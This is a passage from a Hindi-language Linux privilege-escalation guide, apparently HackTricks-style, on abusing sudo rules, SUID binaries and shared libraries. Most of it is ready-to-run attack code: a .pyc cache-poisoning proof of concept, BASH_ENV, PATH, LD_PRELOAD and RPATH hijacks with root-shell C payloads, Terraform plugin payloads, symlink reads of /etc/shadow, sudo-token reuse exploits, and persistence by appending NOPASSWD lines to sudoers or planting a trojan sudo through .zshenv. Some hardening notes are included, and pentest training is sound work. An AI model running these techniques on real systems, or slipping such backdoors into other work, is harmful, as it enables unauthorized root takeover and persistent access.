$ sudo -l
User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

यह उदाहरण, **HTB मशीन Admirer पर आधारित**, root के रूप में script चलाते समय किसी भी python library को लोड करने के लिए **PYTHONPATH hijacking** के प्रति **असुरक्षित** था:

```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```

### sudo-allowed Python imports में writable `__pycache__` / `.pyc` poisoning

अगर कोई **sudo-allowed Python script** ऐसे module को import करती है जिसकी package directory में **writable `__pycache__`** है, तो आप cached `.pyc` को बदलकर अगले import पर privileged user के रूप में code execution पा सकते हैं।<sup>[[30]](#references)</sup>

- यह क्यों काम करता है:
  - CPython bytecode caches को `__pycache__/module.cpython-<ver>.pyc` में रखता है।<sup>[[31]](#references)</sup>
  - Interpreter **header** (magic + source से जुड़े timestamp/hash metadata) को validate करता है, फिर उस header के बाद मौजूद marshaled code object को execute करता है।
  - अगर directory writable होने के कारण आप cached file को **delete और recreate** कर सकते हैं, तो root-owned लेकिन non-writable `.pyc` को भी बदला जा सकता है।
- आम तरीका:
  - `sudo -l` में कोई Python script या wrapper दिखता है जिसे आप root के रूप में चला सकते हैं।
  - वह script `/opt/app/`, `/usr/local/lib/...` आदि से local module import करती है।
  - Imported module की `__pycache__` directory आपकी user या सभी के लिए writable है।

त्वरित enumeration:

```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```

यदि आप privileged script का निरीक्षण कर सकते हैं, तो आयातित modules और उनके cache path की पहचान करें:<sup>[[32]](#references)</sup>

```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```

Abuse workflow:

1. sudo से चलाने की अनुमति वाली script को एक बार चलाएँ, ताकि Python legit cache file बना दे, अगर वह पहले से मौजूद न हो।
2. legit `.pyc` से पहले 16 bytes पढ़ें और उन्हें poisoned file में दोबारा इस्तेमाल करें।
3. एक payload code object compile करें, उसे `marshal.dumps(...)` करें, मूल cache file हटाएँ और उसे मूल header तथा आपके malicious bytecode के साथ फिर से बनाएँ।
4. sudo से चलाने की अनुमति वाली script दोबारा चलाएँ, ताकि import आपका payload root के रूप में execute करे।

महत्वपूर्ण नोट्स:

- मूल header को दोबारा इस्तेमाल करना महत्वपूर्ण है, क्योंकि Python cache metadata की जाँच source file से करता है—यह नहीं जाँचता कि bytecode body वास्तव में source से मेल खाती है या नहीं।
- यह खास तौर पर तब उपयोगी है, जब source file का मालिक root हो और उसमें लिखना संभव न हो, लेकिन उसके containing `__pycache__` directory में लिखना संभव हो।
- `PYTHONDONTWRITEBYTECODE=1` और `python -B` Python को नई `.pyc` files लिखने से रोकते हैं; वे पहले से मौजूद, हमलावर द्वारा बदली गई cache को load करने से **नहीं** रोकते। अहम सीमा यह है कि क्या कम privileges वाला user ऐसी cache बदल सकता है जिसे privileged import स्वीकार करेगा। Python cached bytecode load करने से पहले timestamp/size या hash metadata जाँचता है। [Python import reference](https://docs.python.org/3.12/reference/import.html#cached-bytecode-invalidation) और [command-line documentation](https://docs.python.org/3.12/using/cmdline.html#envvar-PYTHONDONTWRITEBYTECODE) देखें।

न्यूनतम proof-of-concept का ढाँचा:

```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
    src = pathlib.Path(d) / "x.py"
    src.write_text(payload)
    code = compile(src.read_text(), str(src), "exec")
    pyc.unlink()
    pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```

Hardening:

- सुनिश्चित करें कि privileged Python import path में कोई भी directory low-privileged users द्वारा writable न हो, जिसमें `__pycache__` भी शामिल है।
- cache-directory के ownership और permissions का audit करें, जिसमें मौजूदा `.pyc` files भी शामिल हैं। Bytecode writes को disable करने से नए cache बनने कम हो सकते हैं, लेकिन इससे पहले से मौजूद replaceable cache निष्प्रभावी नहीं होता।
- Writable local Python modules और writable cache directories को उसी तरह मानें, जैसे root द्वारा execute की जाने वाली writable shell scripts या shared libraries को मानते हैं।

### BASH_ENV को sudo env_keep के ज़रिए बनाए रखकर → root shell

अगर sudoers `BASH_ENV` को बनाए रखता है (जैसे, `Defaults env_keep+="ENV BASH_ENV"`), तो किसी allowed command को invoke करते समय root के रूप में arbitrary code चलाने के लिए Bash के non-interactive startup behavior का फायदा उठाया जा सकता है।<sup>[[24]](#references)</sup>

- यह क्यों काम करता है: Non-interactive shells के लिए, Bash target script चलाने से पहले `$BASH_ENV` का मूल्यांकन करता है और उस file को source करता है। sudo के कई rules किसी script या shell wrapper को चलाने की अनुमति देते हैं। अगर sudo द्वारा `BASH_ENV` बनाए रखा जाता है, तो आपकी file root privileges के साथ source होती है।<sup>[[23]](#references)</sup>

- आवश्यकताएँ:
  - ऐसा sudo rule जिसे आप चला सकें (कोई भी target जो `/bin/bash` को non-interactively invoke करता हो, या कोई भी bash script)।
  - `BASH_ENV` का `env_keep` में मौजूद होना (`sudo -l` से जाँचें)।

- PoC:

```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```

- सुरक्षा सुदृढ़ीकरण:
  - `BASH_ENV` (और `ENV`) को `env_keep` से हटाएँ; `env_reset` को प्राथमिकता दें।
  - `sudo`-अनुमत commands के लिए shell wrappers से बचें; minimal binaries का उपयोग करें।
  - संरक्षित env vars का उपयोग होने पर sudo I/O logging और alerting पर विचार करें।

### sudo के ज़रिए Terraform, संरक्षित HOME के साथ (!env_reset)

जब sudo किसी अधिक privileged user के रूप में Terraform चलाने की अनुमति देता है, तो `!env_reset` यह जाँचने का संकेत है कि उस खास rule में वास्तव में कौन-से environment variables बने रहते हैं। किसी caller-writable `.terraformrc` या `terraform.rc` को सक्रिय CLI configuration मानने से पहले, प्रभावी `HOME` या `TF_CLI_CONFIG_FILE` की पुष्टि करें। `provider_installation.dev_overrides` entry तभी मायने रखती है, जब तय Terraform command उस provider को load करे और caller उसके executable को चुनी गई directory में रख सके।<sup>[[25]](#references)</sup>

- आवश्यक provider को writable directory पर point करें और provider के नाम पर एक malicious plugin रखें (उदाहरण के लिए, `terraform-provider-examples`):

```hcl
# ~/.terraformrc
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/dev/shm"
  }
  direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

Terraform Go plugin handshake में विफल होगा, लेकिन बंद होने से पहले payload को root के रूप में execute करेगा और पीछे एक SUID shell छोड़ जाएगा।

### TF_VAR overrides + symlink validation bypass

यदि विशिष्ट sudo rule इन variables को सुरक्षित रखता है, तो Terraform variables `TF_VAR_<name>` environment variables के ज़रिए दिए जा सकते हैं। Source-symlink **read** के लिए ऐसे provider की भी ज़रूरत होती है जो link को follow करे और सुरक्षित परिणाम को ऐसी destination पर copy करे जिसे caller पढ़ सके। Destination-symlink **write** के लिए अलग से caller के नियंत्रण वाली destination entry और ऐसा privileged provider चाहिए जो लिखते समय उसे follow करे; बाद में चलने वाली scheduled job इसका सिर्फ़ एक संभावित परिणाम है। इनमें से किसी भी रास्ते को आज़माने से पहले, केवल-पढ़ने वाले commands जैसे `sudo -l`, `stat` और `readlink` से सटीक sudo grant, संबंधित `.tf` files, चुने हुए CLI config और path ownership की जाँच करें। `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` जैसे कमज़ोर lexical validations symlinks को resolve नहीं करते:<sup>[[25]](#references)</sup>

```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```

Terraform symlink को resolve करता है और असली `/root/root.txt` को attacker-readable destination में कॉपी करता है। इसी तरीके का इस्तेमाल destination symlinks पहले से बनाकर privileged paths में **लिखने** के लिए भी किया जा सकता है (उदाहरण के लिए, provider के destination path को `/etc/cron.d/` के अंदर इंगित करना)।

### requiretty / !requiretty

कुछ पुराने distributions में, sudo को `requiretty` के साथ configure किया जा सकता है, जो sudo को केवल interactive TTY से चलाने की अनुमति देता है। अगर `!requiretty` सेट है (या यह option मौजूद नहीं है), तो sudo को reverse shells, cron jobs या scripts जैसे non-interactive contexts से चलाया जा सकता है।

```bash
Defaults !requiretty
```

यह अपने आप में कोई सीधी vulnerability नहीं है, लेकिन इससे वे स्थितियाँ बढ़ जाती हैं जिनमें पूरी PTY की आवश्यकता के बिना sudo rules का दुरुपयोग किया जा सकता है।

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

अगर `sudo -l` में `env_keep+=PATH` दिखता है या `secure_path` में attacker-writable entries (जैसे, `/home/<user>/bin`) हैं, तो sudo-allowed target के अंदर कोई unqualified external command किसी दूसरी फ़ाइल से shadow हो सकता है।<sup>[[3]](#references)</sup> यदि प्रभावी `secure_path` मौजूद नहीं है, तो इसकी भी समीक्षा करें **यदि** command का sudo environment caller-controlled `PATH` को बनाए रखता है; केवल इसका मौजूद न होना यह साबित नहीं करता कि ऐसा होता है। अनुमत script को चलाए बिना पढ़ें, फिर सटीक RunAs और argument rule, प्रभावी command search path, और command के नाम वाली ऐसी शुरुआती directory की पुष्टि करें जिस पर लिखने और traverse करने की अनुमति हो। Authentication, `NOEXEC`, shell builtins और absolute command paths नतीजे को बदल सकते हैं।

- आवश्यकताएँ: ऐसा sudo rule (अक्सर `NOPASSWD`) जो ऐसी script/binary चलाता हो जिसमें commands को बिना absolute paths (`free`, `df`, `ps` आदि) के call किया जाता हो, और `PATH` की ऐसी writable entry हो जिसे सबसे पहले search किया जाता हो।

```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```

### Sudo execution में paths को bypass करना
अन्य files पढ़ने या **symlinks** इस्तेमाल करने के लिए **जंप** करें। उदाहरण के लिए, sudoers file में: _hacker10 ALL= (root) /bin/less /var/log/\*_

```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```

यदि **wildcard** का उपयोग किया जाता है (\*), तो यह और भी आसान है:

```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```

**Countermeasures**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### कमांड पाथ के बिना Sudo command/SUID binary

अगर **sudo permission** किसी एक command को **पाथ बताए बिना** दी गई है: _hacker10 ALL= (root) less_, तो PATH variable बदलकर इसका exploit किया जा सकता है.

```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```

इस technique का उपयोग तब भी किया जा सकता है, जब कोई **suid** binary **किसी command को उसका path बताए बिना execute करती है (किसी अजीब SUID binary के content को हमेशा** _**strings**_ **से जाँचें)**।

[Execute करने के लिए payload के उदाहरण।](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### SUID binary के साथ command path

अगर **suid** binary **किसी दूसरे command को उसका path बताकर execute करती है**, तो आप उस command के नाम से एक **function बना और export** कर सकते हैं, जिसे suid file call कर रही है।

उदाहरण के लिए, अगर कोई suid binary _**/usr/sbin/service apache2 start**_ को call करती है, तो आपको function बनाने और उसे export करने की कोशिश करनी चाहिए:

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

फिर, जब आप suid binary को कॉल करेंगे, तो यह function निष्पादित होगा

### Custom SUID copy wrappers

ऐसी SUID utility जिसका मालिक root हो और जो source तथा destination paths स्वीकार करती हो, दो अलग-अलग trust boundaries पार कर सकती है। यदि यह किसी भी argument से shell command बनाती है (उदाहरण के लिए, तैयार किया गया `cp` command `system()` को देना), तो shell metacharacters इसके effective privileges के साथ कोई अन्य command चला सकते हैं। भले ही यह shell के बिना सुरक्षित रूप से `cp` चलाती हो, unrestricted destination से `/etc/passwd` जैसी files में मनमाना privileged write संभव हो सकता है। Wrapper के argument handling, effective UID behavior, destination restrictions और इस बात की जाँच करें कि copied file में caller द्वारा नियंत्रित contents बने रहते हैं या नहीं; सामान्य `cp` error या SUID bit अकेले इनमें से किसी भी रास्ते का प्रमाण नहीं है। किसी भी manual testing से पहले binary और permissions को निष्क्रिय रूप से enumerate करें।

### SUID wrapper द्वारा निष्पादित writable script

एक आम custom-app misconfiguration में root-owned SUID binary wrapper एक script निष्पादित करता है, जबकि वह script low-privilege users द्वारा writable होती है।

सामान्य pattern:

```c
int main(void) {
    system("/bin/bash /usr/local/bin/backup.sh");
}
```

अगर `/usr/local/bin/backup.sh` लिखने योग्य है, तो आप उसमें payload commands जोड़ सकते हैं और फिर SUID wrapper को execute कर सकते हैं:

```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```

त्वरित जाँचें:

```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```

यह attack path विशेष रूप से `/usr/local/bin` में उपलब्ध "maintenance"/"backup" wrappers में आम है।

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** environment variable का उपयोग loader को एक या अधिक shared libraries (.so files) लोड करने के लिए निर्दिष्ट करने में किया जाता है। इन्हें loader अन्य सभी libraries से पहले लोड करता है, जिनमें standard C library (`libc.so`) भी शामिल है। इस प्रक्रिया को library preloading कहा जाता है।

हालाँकि, system security बनाए रखने और इस feature के दुरुपयोग को रोकने के लिए, विशेषकर **suid/sgid** executables के मामले में, system कुछ शर्तें लागू करता है:

- Loader उन executables के लिए **LD_PRELOAD** को अनदेखा करता है जिनका real user ID (_ruid_) effective user ID (_euid_) से मेल नहीं खाता।
- suid/sgid वाले executables के लिए, केवल standard paths में मौजूद वे libraries preload की जाती हैं जिनमें suid/sgid भी सेट हो।

यदि आपके पास `sudo` के साथ commands चलाने की क्षमता है और `sudo -l` के output में **env_keep+=LD_PRELOAD** कथन शामिल है, तो Privilege escalation हो सकती है। यह configuration **LD_PRELOAD** environment variable को बनाए रखने और `sudo` के साथ commands चलाने पर भी उसे पहचानने की अनुमति देती है, जिससे संभावित रूप से elevated privileges के साथ मनमाना code चलाया जा सकता है।<sup>[[9]](#references)</sup>

```
Defaults        env_keep += LD_PRELOAD
```

इस रूप में सहेजें **/tmp/pe.c**

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

फिर इसे **... का उपयोग करके compile करें**:

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

अंत में, **escalate privileges** चलाकर

```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```

> [!CAUTION]
> अगर attacker **LD_LIBRARY_PATH** env variable को नियंत्रित करता है, तो इसी तरह के privesc का दुरुपयोग किया जा सकता है, क्योंकि वह उस path को नियंत्रित करता है जहाँ libraries खोजी जाएँगी।

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```

### SUID Binary – .so injection

जब कोई असामान्य **SUID** permissions वाली binary मिले, तो यह जाँचना अच्छा अभ्यास है कि वह **.so** files को सही ढंग से load कर रही है या नहीं। इसे निम्न command चलाकर जाँचा जा सकता है:<sup>[[17]](#references)</sup>

```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```

उदाहरण के लिए, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ जैसी error मिलने पर exploitation की संभावना का संकेत मिलता है।

इसका exploitation करने के लिए, _"/path/to/.config/libcalc.c"_ नाम की C file बनाकर उसमें निम्नलिखित code लिखा जा सकता है:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

यह कोड, एक बार compile और execute हो जाने पर, file permissions में बदलाव करके और elevated privileges के साथ shell चलाकर विशेषाधिकार बढ़ाने का लक्ष्य रखता है।

ऊपर दी गई C file को shared object (.so) file में compile करें:

```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```

अंततः, प्रभावित SUID बाइनरी चलाने पर exploit ट्रिगर होना चाहिए, जिससे सिस्टम compromise हो सकता है।

## Shared Object Hijacking

```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

अब जब हमें एक ऐसा SUID binary मिल गया है जो उस फ़ोल्डर से library लोड करता है जिसमें हम लिख सकते हैं, तो आइए उस फ़ोल्डर में ज़रूरी नाम वाली library बनाएँ:

```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

यदि आपको इस तरह की कोई त्रुटि मिलती है

```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```

इसका मतलब है कि आपके द्वारा जनरेट की गई library में `a_function_name` नाम का function होना चाहिए।

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) Unix binaries की एक चुनी हुई सूची है, जिनका इस्तेमाल attacker स्थानीय सुरक्षा प्रतिबंधों को bypass करने के लिए कर सकता है। [**GTFOArgs**](https://gtfoargs.github.io/) भी इसी तरह की सूची है, लेकिन उन मामलों के लिए जहाँ आप किसी command में **केवल arguments inject कर सकते हैं**।

यह project Unix binaries के वैध functions को एकत्र करता है, जिनका दुरुपयोग restricted shells से बाहर निकलने, elevated privileges बढ़ाने या बनाए रखने, files transfer करने, bind और reverse shells शुरू करने, और अन्य post-exploitation कार्यों को आसान बनाने के लिए किया जा सकता है।

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

अगर आप `sudo -l` चला सकते हैं, तो [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) tool का इस्तेमाल करके जाँच सकते हैं कि क्या वह किसी sudo rule का exploit ढूँढ़ता है।

### Sudo Tokens का दोबारा इस्तेमाल

ऐसे मामलों में जहाँ आपके पास **sudo access** है, लेकिन password नहीं है, आप **sudo command के execution का इंतज़ार करके और फिर session token को hijack करके** privileges बढ़ा सकते हैं।<sup>[[18]](#references)</sup>

Privileges बढ़ाने की आवश्यकताएँ:

- आपके पास पहले से user "_sampleuser_" के रूप में shell है
- "_sampleuser_" ने **पिछले 15 मिनट में** कुछ execute करने के लिए `sudo` का इस्तेमाल किया हो (डिफ़ॉल्ट रूप से sudo token की अवधि इतनी होती है, जिसके दौरान हम password दिए बिना `sudo` का इस्तेमाल कर सकते हैं)
- `cat /proc/sys/kernel/yama/ptrace_scope` का मान 0 है
- `gdb` उपलब्ध है (आप इसे upload कर सकते हैं)

(आप `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` चलाकर `ptrace_scope` को अस्थायी रूप से enable कर सकते हैं, या `/etc/sysctl.d/10-ptrace.conf` में बदलाव करके और `kernel.yama.ptrace_scope = 0` सेट करके इसे स्थायी रूप से enable कर सकते हैं।)

अगर ये सभी आवश्यकताएँ पूरी होती हैं, तो आप privileges बढ़ाने के लिए इसका इस्तेमाल कर सकते हैं: [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **पहला exploit** (`exploit.sh`) _/tmp_ में `activate_sudo_token` binary बनाएगा। आप इसका इस्तेमाल अपने session में **sudo token activate करने के लिए** कर सकते हैं (आपको अपने-आप root shell नहीं मिलेगा, `sudo su` चलाएँ):

```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```

- **दूसरा exploit** (`exploit_v2.sh`) _/tmp_ में root के स्वामित्व वाला **setuid** वाला sh shell बनाएगा.

```bash
bash exploit_v2.sh
/tmp/sh -p
```

- **तीसरा exploit** (`exploit_v3.sh`) एक **sudoers फ़ाइल बनाएगा**, जिससे **sudo tokens हमेशा के लिए मान्य रहेंगे और सभी उपयोगकर्ता sudo का इस्तेमाल कर सकेंगे**.

```bash
bash exploit_v3.sh
sudo su
```

### /var/run/sudo/ts/\<Username>

अगर आपके पास फ़ोल्डर में या फ़ोल्डर के अंदर बनाई गई किसी फ़ाइल पर **write permissions** हैं, तो आप किसी user और PID के लिए **sudo token बनाने** हेतु binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) का इस्तेमाल कर सकते हैं।\
उदाहरण के लिए, अगर आप फ़ाइल _/var/run/sudo/ts/sampleuser_ को overwrite कर सकते हैं और आपके पास उस user के रूप में PID 1234 वाली shell है, तो password जाने बिना **sudo privileges प्राप्त** कर सकते हैं:

```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```

### /etc/sudoers, /etc/sudoers.d

फ़ाइल `/etc/sudoers` और `/etc/sudoers.d` के अंदर की फ़ाइलें कॉन्फ़िगर करती हैं कि कौन `sudo` का उपयोग कर सकता है और कैसे। **डिफ़ॉल्ट रूप से, इन्हें केवल root user और root group ही पढ़ सकते हैं**।\
**अगर** आप इस फ़ाइल को **पढ़** सकते हैं, तो आपको **कुछ दिलचस्प जानकारी मिल सकती है**, और अगर आप कोई भी फ़ाइल **लिख** सकते हैं, तो आप **privileges escalate** कर पाएँगे।

```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```

यदि आपके पास write access है, तो आप इस permission का दुरुपयोग कर सकते हैं.

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```

इन अनुमतियों का दुरुपयोग करने का एक और तरीका:

```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```

### DOAS

`sudo` binary के कुछ विकल्प हैं, जैसे OpenBSD के लिए `doas`। इसकी configuration `/etc/doas.conf` में जाँचना न भूलें।

```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```

यदि `doas` किसी editor या interpreter को चलाने की अनुमति देता है, तो GTFOBins-style escapes जांचें:

```bash
doas vim
:!/bin/sh
```

मूल Python-आधारित `dstat` के लिए root-capable `doas` rule में plugin-path की भी जाँच होनी चाहिए। इसके [manual](https://github.com/dstat-real/dstat/blob/master/docs/dstat.1) और [source](https://github.com/dstat-real/dstat/blob/master/dstat) में `dstat_*.py` plugins की locations में `/usr/share/dstat/` और `/usr/local/share/dstat/` शामिल हैं। अगर मौजूदा user उस location में लिख और search कर सकता है जिसका installed build वास्तव में इस्तेमाल करता है, तो चुना गया plugin `doas` RunAs identity के साथ चल सकता है। प्रभावी rule, उस build में plugin lookup, directory और parent permissions या ACLs, और यह पुष्टि करें कि caller plugin चुन सकता है या नहीं; केवल `dstat` rule या writable directory होना एक सुराग भर है। दूसरे `dstat` implementations में अलग plugin systems हो सकते हैं। Plugin लोड किए बिना metadata का निरीक्षण करें।

### Sudo Hijacking

अगर आपको पता है कि कोई **user आम तौर पर किसी machine से connect करके privileges escalate करने के लिए `sudo` का इस्तेमाल करता है** और आपको उस user context में shell मिल गया है, तो आप **एक नया sudo executable बना सकते हैं**, जो आपका code root के रूप में और उसके बाद user की command चलाएगा। फिर, **user context का $PATH बदलें** (उदाहरण के लिए, `.bash_profile` में नया path जोड़कर), ताकि user के `sudo` चलाने पर आपका sudo executable चले।

ध्यान दें कि अगर user किसी दूसरे shell का इस्तेमाल करता है (bash नहीं), तो नया path जोड़ने के लिए आपको दूसरी files बदलनी होंगी। उदाहरण के लिए, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` को बदलता है। एक और उदाहरण [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) में मिल सकता है।

या कुछ ऐसा चलाकर:

```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```

## Shared Library

### ld.so

फ़ाइल `/etc/ld.so.conf` बताती है कि **लोड की गई कॉन्फ़िगरेशन फ़ाइलें कहाँ से ली जाती हैं**। आम तौर पर, इस फ़ाइल में यह path होता है: `include /etc/ld.so.conf.d/*.conf`

इसका मतलब है कि `/etc/ld.so.conf.d/*.conf` की कॉन्फ़िगरेशन फ़ाइलें पढ़ी जाएँगी। ये कॉन्फ़िगरेशन फ़ाइलें **अन्य फ़ोल्डरों की ओर संकेत करती हैं**, जहाँ **libraries** को **खोजा** जाएगा। उदाहरण के लिए, `/etc/ld.so.conf.d/libc.conf` का कंटेंट `/usr/local/lib` है। **इसका मतलब है कि सिस्टम `/usr/local/lib` के अंदर libraries खोजेगा**।

अगर किसी वजह से **किसी user के पास** इन paths में से किसी पर भी write permissions **हैं**: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` के अंदर मौजूद कोई फ़ाइल, या `/etc/ld.so.conf.d/*.conf` की कॉन्फ़िगरेशन फ़ाइल में दिया गया कोई फ़ोल्डर, तो वह privileges escalate करने में सक्षम हो सकता है।\
**इस misconfiguration का exploitation कैसे करें**, यह जानने के लिए यह पेज देखें:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH

```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
```

`lib` को `/var/tmp/flag15/` में कॉपी करने पर, प्रोग्राम इस स्थान से इसका उपयोग करेगा, जैसा कि `RPATH` चर में निर्दिष्ट है।

```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```

इसके बाद, `/var/tmp` में `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` का उपयोग करके एक दुर्भावनापूर्ण लाइब्रेरी बनाएँ।

```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
```

## Capabilities

Linux capabilities किसी process को उपलब्ध root privileges का **एक subset प्रदान करती हैं**। इससे root **privileges छोटे और अलग-अलग units में बंट जाते हैं**। फिर इनमें से हर unit को processes को स्वतंत्र रूप से दिया जा सकता है। इस तरह privileges का पूरा set कम हो जाता है, जिससे exploitation के जोखिम घटते हैं।\
Capabilities और उनके दुरुपयोग के तरीकों के बारे में **और जानने के लिए** यह page पढ़ें:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Directory permissions

किसी directory में **"execute" bit** का अर्थ है कि प्रभावित user उस folder में "**cd**" कर सकता है।\
**"read" bit** का अर्थ है कि user **files** की सूची देख सकता है, और **"write" bit** का अर्थ है कि user नई **files** बना और मौजूदा **files** delete कर सकता है।

## ACLs

